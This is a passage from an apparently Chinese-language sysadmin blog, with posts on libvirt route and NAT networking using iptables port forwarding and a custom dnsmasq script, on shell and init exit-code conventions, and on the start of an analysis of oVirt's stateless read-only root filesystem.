style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dhcp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">range</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">start</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.128</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">end</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag attr-value" style="color:#e3116c">192.168.1.254</span><span class="token tag attr-value punctuation" style="color:#393A34">&#x27;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dhcp</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ip</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">network</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<p>接着生成并启用该网络</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-define route.xml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-start route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">virsh net-autostart route</span><br></span></code></pre></div></div>
<ul>
<li>/etc/libvirt/qemu/networks/  virsh net-define的network会保存到这</li>
<li>/var/lib/libvirt/network/  net-start启动了的network同时也会会保存到这</li>
<li>/etc/libvirt/qemu/networks/autostart/  net-autostart的network同时也会保存到这</li>
</ul>
<p>接下来，我们需要修改em1的配置并将其桥接到virbr1上</p>
<p>ifcfg-em1</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DEVICE=&quot;em1&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ONBOOT=&quot;yes&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">BRIDGE=virbr1</span><br></span></code></pre></div></div>
<p>接着启动em1</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ifup em1</span><br></span></code></pre></div></div>
<p>至此em1就被桥接到了virbr1上，可以使用下面的命令检查</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">brctl show</span><br></span></code></pre></div></div>
<p>现在我们需要在本机添加一条默认路由，不然虚拟机是访问不了外面的：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">route add default gw 192.168.1.1 dev virbr1</span><br></span></code></pre></div></div>
<p>这里的192.168.1.1是真实的路由。至此，问题已经解决了。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义nat网络">自定义nat网络<a href="#自定义nat网络" class="hash-link" aria-label="自定义nat网络的直接链接" title="自定义nat网络的直接链接">​</a></h2>
<p>下面说说问题1的解决方法：
既然知道了nat出去的虚拟机只能访问外网而外网却不能访问进来，nat又是通过iptables来做的，也就是当libvirt每次启动的时候都会往iptables最前面插入自己的规则以保证nat的虚拟机能正常访问外网，那么我们是不是可以通过修改iptables的规则来实现呢，比如我们需要一个内网ip的虚拟机对外提供80服务，那么我们就把物理机的80端口映射到这台虚拟机的80端口上，因为我们的物理机是可以直接和虚拟机通信的，只是外网不能而已，下面添加规则：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A PREROUTING -p tcp -i virbr1 --dport 80  -j DNAT --to-destination 192.168.122.2:80</span><br></span></code></pre></div></div>
<p>这样我们对外部访问80端口进来的数据进行了dnat，而出去的我们不用snat，只需要再添加如下规则：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span></code></pre></div></div>
<p>至此问题看似得到解决，但是我们忽略了一个关键的问题，那就是每当libvirt启动的时候就会往表的最前面插入它自己的规则，而iptables的规则是有先后顺序的，也就是说，我们自己添加的规则在libvirtd服务重启之后即被libvirt定义的规则所淹没，怎么办呢，我现在只想到了这么一个方法，直接修改libvirtd的启动脚本，在它的规则生效之后插入我们自定义的规则：</p>
<p>vi  /etc/init.d/libvirtd</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">start() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo -n $&quot;Starting $SERVICE daemon: &quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    initctl_check</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mkdir -p /var/cache/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    rm -rf /var/cache/libvirt/*</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    KRB5_KTNAME=$KRB5_KTNAME daemon --pidfile $PIDFILE --check $SERVICE $PROCESS --daemon $LIBVIRTD_CONFIG_ARGS $LIBVIRTD_ARGS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    RETVAL=$?</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    echo</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ $RETVAL -eq 0 ] &amp;&amp; touch /var/lock/subsys/$SERVICE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    sleep 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iptables -D FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    iptables -I FORWARD -i virbr1 -o virbr0 -p tcp -m state --state NEW -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">... ...</span><br></span></code></pre></div></div>
<p>至此问题基本解决。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="route网络转换nat网络">route网络转换nat网络<a href="#route网络转换nat网络" class="hash-link" aria-label="route网络转换nat网络的直接链接" title="route网络转换nat网络的直接链接">​</a></h2>
<p>另外一个问题，我们前面有发现route和nat的网络区别仅仅是一个做了nat的iptables规则一个没有，那么我们可不可以自己在iptables里面添加相应的规则将route网络变身为nat网络呢？答案肯定是可以的，只需要添加上下面的规则即可,原理还请观看本文的同学自己分析，这里假设我们route网络给虚拟机分配的ip是192.168.100.0/24网段：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -s 192.168.100.0/24 -d ! 192.168.100.0/24 -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A FORWARD --destination 192.168.100.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="自定义dnsmasq">自定义dnsmasq<a href="#自定义dnsmasq" class="hash-link" aria-label="自定义dnsmasq的直接链接" title="自定义dnsmasq的直接链接">​</a></h2>
<p>这里再添加一个可以手工启动dnsmasq的小脚本</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">brctl addbr routebr</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig routebr 192.168.122.1 netmask 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -t nat -A POSTROUTING -s 192.168.122.0/24 -d ! 192.168.122.0/24 -j MASQUERADE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">iptables -A FORWARD --destination 192.168.122.0/24 -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/sbin/dnsmasq \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--strict-order \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--bind-interfaces \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--pid-file=/usr/local/vps/network/default.pid \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--conf-file= \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--except-interface lo \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--listen-address 192.168.122.1 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-range 192.168.122.2,192.168.122.254 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-leasefile=/usr/local/vps/network/dnsmasq/default.leases \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-lease-max=253 \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-no-override \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">--dhcp-hostsfile=/usr/local/vps/network/dnsmasq/default.hostsfile</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="重启network导致网络中断">重启network导致网络中断<a href="#重启network导致网络中断" class="hash-link" aria-label="重启network导致网络中断的直接链接" title="重启network导致网络中断的直接链接">​</a></h2>
<p>当我们需要实时修改network的配置并使之生效的时候，就得重新启动此network，也就是需要net-destroy再net-start一下，我们的配置才能生效，但是随之而来的问题是，当network被重新启动之后，虚拟机便无法访问网络了，除非把虚拟机的network interface重新attach一下，或者等到虚拟机重新启动，那么为什么会出现这样的问题呢？我们先从它的表象开始分析，至于是否要追究到源码里面就取决于同学们自己了，反正我暂时没那功夫。这里仅仅是抛出来了一块砖。</p>
<p>当一个network启动之后，会自动生成一个虚拟网卡接口如virbr1，也会生成其他一些需要的东西，而重新启动了libvirt的network之后这个接口也会被重启，所以就导致了中途有一个中断的过程，</p>
<p>那事情就比较清晰了，如果你将libvirt启动网络的所有过程拆分开来一个一个的手动生成，需要修改某一部分配置的时候实际上你只需要修改对应的配置文件而不需要重新启动这个virbr1接口，比如上面提到的mac+ip的绑定，如果把dnsmasq独立出来，不让libvirt接管，那么增加了mac+ip绑定之后，仅仅需要重启dnsmasq这个服务。</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/libvirt">libvirt</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/network">network</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/05/17/bash-shell-exit-code">正确使用shell返回值</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-05-17T00:00:00.000Z">2013年5月17日</time> · <!-- -->阅读需 2 分钟</div></header><div class="markdown"><blockquote>
<p>编写shell脚本的时候，正确使用返回值是运维人员的基本操守</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="1常见返回值">1.常见返回值<a href="#1常见返回值" class="hash-link" aria-label="1.常见返回值的直接链接" title="1.常见返回值的直接链接">​</a></h2>
<p>下表列出了常见shell命令的退出返回值：</p>
<table><thead><tr><th>返回值</th><th style="text-align:left">含义</th><th style="text-align:center">示例</th><th>说明</th></tr></thead><tbody><tr><td>1</td><td style="text-align:left">各种常见错误</td><td style="text-align:center">let &quot;var1 = 1/0&quot;</td><td>shell里面最常见的错误返回值</td></tr><tr><td>2</td><td style="text-align:left">shell内建功能使用错误</td><td style="text-align:center">empty_function() </td><td>常见于关键字或者命令出错</td></tr><tr><td>126</td><td style="text-align:left">命令无法执行</td><td style="text-align:center">/dev/null</td><td>由于权限等导致的命令无法执行</td></tr><tr><td>127</td><td style="text-align:left">命令无法找到</td><td style="text-align:center">illegal_command</td><td>一般是PATH环境变量不对等</td></tr><tr><td>128</td><td style="text-align:left">退出返回值错误</td><td style="text-align:center">exit 3.14159</td><td>返回值只能是整数，小数就不对了</td></tr><tr><td>128+n</td><td style="text-align:left">信号 &quot;n&quot;+128</td><td style="text-align:center">kill -9 $PPID of script</td><td>$? 即返回 137 (128 + 9)</td></tr><tr><td>130</td><td style="text-align:left">ctrl+c 退出</td><td style="text-align:center">Ctl-C</td><td>其实ctrl+c返回的是2 (130 = 128 + 2)</td></tr><tr><td>255*</td><td style="text-align:left">返回值超出可接受的范围</td><td style="text-align:center">exit  -1</td><td>只能是 0 - 255</td></tr></tbody></table>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="2-init标准返回值">2. init标准返回值<a href="#2-init标准返回值" class="hash-link" aria-label="2. init标准返回值的直接链接" title="2. init标准返回值的直接链接">​</a></h2>
<p>下表列出了关于/etc/init.d/目录下启动控制脚本的标准返回值：</p>
<ul>
<li>0    程序在运行或者服务状态OK</li>
<li>1    程序已经死掉，但是 pid文件仍在 /var/run目录下存在</li>
<li>2    程序已经死掉，但是lock文件仍在 /var/lock 目录下存在</li>
<li>3    程序没有运行</li>
<li>4    程序运行状态未知</li>
<li>5-99    供LSB扩展的保留段</li>
<li>100-149    供特定系统发行版使用的保留段</li>
<li>150-199    供 特定程序使用的保留段</li>
<li>200-254    保留段</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="3-建议返回值">3. 建议返回值<a href="#3-建议返回值" class="hash-link" aria-label="3. 建议返回值的直接链接" title="3. 建议返回值的直接链接">​</a></h2>
<p>在写shell脚本的时候需要注意自定义的退出返回值最好不要与上面表格中所定义的重复，对于管理人员来说养成良好的习惯有助于遇到错误时作出正确的判断。
根据上表至少可以得出，在自定义返回值的时候：</p>
<ul>
<li>最好不要用的：0-4 126-130 255</li>
<li>应避免使用的：5-99</li>
<li>可随意使用的：100-125 131-254</li>
</ul>
<p>参考文档:</p>
<ul>
<li>
<p>[1] <a href="http://tldp.org/LDP/abs/html/exitcodes.html" target="_blank" rel="noopener noreferrer">http://tldp.org/LDP/abs/html/exitcodes.html</a></p>
</li>
<li>
<p>[2] <a href="http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html" target="_blank" rel="noopener noreferrer">http://refspecs.linux-foundation.org/LSB_4.1.0/LSB-Core-generic/LSB-Core-generic/iniscrptact.html</a></p>
</li>
</ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/bash">bash</a></li><li class="tag_QGVx"><a rel="tag" class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/exitcode">exitcode</a></li></ul></div></footer></article><article class="margin-bottom--xl"><header><h2 class="title_f1Hy"><a href="/notes/blog/2013/03/14/ovirt-stateless">Ovirt中的stateless实现机制分析</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-14T00:00:00.000Z">2013年3月14日</time> · <!-- -->阅读需 9 分钟</div></header><div class="markdown"><blockquote>
<p>我发现ovirt的node也就是运行虚拟机的主机被设计成了这样：整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，明白了为什么需要这种stateless也就是无状态的设计</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="ovirt简介">Ovirt简介<a href="#ovirt简介" class="hash-link" aria-label="Ovirt简介的直接链接" title="Ovirt简介的直接链接">​</a></h2>
<p>这是来自centos wiki中的描述：</p>
<blockquote>
<p>oVirt 是个管理虚拟化的应用程序。言下之意就是你可利用 oVirt 的管理界面（oVirt 引擎）来管理硬件节点、存储及网络资源，并部署及监控在你的数据中心内运行的虚拟机器。
如果你熟识 VMware 的产器，oVirt 在理念上与 vSphere 类同。Red Hat 企业级虚拟化产品以 oVirt 作为基础，这个上游计划内开发的新功能，日后亦会在获支持的产品内出现。</p>
</blockquote>
<p>ovirt是一套虚拟化管理的系统，其对标产品是vmware的vsphere，它分为ovirt-engine和ovirt-node，可以用ovirt的这套系统来管理虚拟机群，现在虚拟化相关产品众多，微软，vmware，oracle等都在做这方面的产品，于是IBM红帽ubuntu等厂商就联合起来开始搞这个东西了，红帽很早就开始投入kvm了，红帽做的是RHEV的整套系统，也分为node和engine只是名字不一样，后来干脆就把node的RHEV-H给贡献出来，大家一起搞ovirt了。前几天我也试用了一下ovirt和RHEV，发现他们的node也就是运行虚拟机的主机被设计成了这样: 整个根文件系统是只读的，只有部分配置文件被独立出来放到了另外的分区，问了几位IBM和红帽的工程师，才知道这叫stateless，无状态，这么做的好处是运行环境和存储分离，提高整体可用性。在分析了ovirt中的stateless实现机制之后，下面将在centos6上尝试手工配置，过程中请教了几位ovirt的开发,再次表示感谢</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="关  于stateless">关于stateless<a href="#关于stateless" class="hash-link" aria-label="关于stateless的直接链接" title="关于stateless的直接链接">​</a></h2>
<p>这种stateless的设计来自很早之前红帽在fedora里面做的尝试，目的是把系统做成liveCD，下面是一些关于stateless的描述：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">read-only root file system(stateless linux)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Readonly root support.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This was add to Fedora for Stateless Linux, i.e. for creating live Fedora CDs.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How to use:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Edit `/etc/sysconfig/readonly-root`. Set &#x27;READONLY&#x27; to &#x27;yes&#x27;.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * Add any exceptions that need to be writable that aren&#x27;t in the stock `/etc/rwtab` to an /etc/rwtab.d file. (See below)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">How it works:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   * On boot, we mount a tmpfs (by default, at /var/lib/stateless/writable), and then parse `/etc/rwtab` and `/etc/rwtab.d/*` for things to put there.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">These files have the format:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`&lt;type&gt;  &lt;path&gt;`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* Types are as follows:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * empty: An empty path. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `empty     /tmp`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * dirs: A directory tree that is copied, empty. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `dirs      /var/run`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  * files: A file or directory tree that is copied intact. Example:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              `files     /etc/resolv.conf`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">A stock rwtab is shipped with common things that need mounted.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">When your computer comes back up, the root and any other system</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">partitions will be mounted read-only. All the files and directories</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">listed in `/etc/rwtab` will be mounted read-write on a tmpfs filesystem.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can add additional files and directories to rwtab to make them</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable after reboot.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that this system is stateless. When you reboot again, everything</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">written to the tmpfs filesystem vanishes and the system will be exactly</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">as it was the last time it was booted. You could add a writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filesystem on disk or NFS for writing files you want to retain after</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rebooting.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Take a look at `/etc/rc.d/rc.sysinit` to see how the magic is done.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">This capability is a &quot;technology preview&quot; (beta) and is buggy. Note that</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`/etc/mtab` and thus &quot;mount&quot; do not show the complete list of filesystems</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">because the /etc directory is on a read-only filesystem. /proc/mounts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">always shows the correct mount information. You could update `/etc/mtab`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">from /proc/mounts to correct it both after boot and after running the</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mount or umount commands to change mounts.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Run `fgrep -v rootfs /proc/mounts &gt;/etc/mtab` to correct `/etc/mtab`.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Note that mounting or symlinking /proc/mounts to /etc/mtab causes other</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">problems such as breaking the df command.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">You can change your read-only root filesystem to read-write mode</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">immediately with this command run by the root user:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`mount -n -o remount,rw /`</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="分析其实现机制">分析其实现机制<a href="#分析其实现机制" class="hash-link" aria-label="分析其实现机制的直接链接" title="分析其实现机制的直接链接">​</a></h2>
<p>下面把分析过程记录下来：</p>
<p>首先我看到的是fstab文件</p>
<p>/etc/fstab</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/dev/root / ext2 defaults,ro,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">devpts /dev/pts devpts gid=5,mode=620 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tmpfs /dev/shm tmpfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proc /proc proc defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sysfs /sys sysfs defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Config /config ext4 defaults,noauto,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">debugfs /sys/kernel/debug debugfs 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Swap swap swap defaults 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Logging /var/log ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/dev/HostVG/Data /data ext4 defaults,noatime 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/images /var/lib/libvirt/images bind bind 0 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/data/core /var/log/core bind bind 0 0</span><br></span></code></pre></div></div>
<p>这里要注意的地方就是root后面的ro，也就是说被挂载成了只读，这说明stateless是在挂载磁盘之前就已经完成，那肯定跟系统启动相关，
接着我们找到rc.sysinit这个在系统启动阶段执行的脚本中下面这段内容:</p>
<p>/etc/rc.d/rc.sysinit</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">for file in /etc/statetab /etc/statetab.d/* ; do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    is_ignored_file &quot;$file&quot; &amp;&amp; continue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    [ ! -f &quot;$file&quot; ] &amp;&amp; continue</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    if [ -f &quot;$STATE_MOUNT/$file&quot; ] ; then</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mount -n --bind &quot;$STATE_MOUNT/$file&quot; &quot;$file&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    fi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    for path in $(grep -v &quot;^#&quot; &quot;$file&quot; 2&gt;/dev/null); do</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        mount_state &quot;$path&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        [ -n &quot;$SELINUX_STATE&quot; -a -e &quot;$path&quot; ] &amp;&amp; restorecon -R &quot;$path&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    done</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">done</span><br></span></code></pre></div></div>
<p>这段shell里面牵扯到了个/etc/statetab,而且通过对比普通系统还发现其他地方的不同</p>
<p>diff rc.sysinit /etc/rc.sysinit</p>
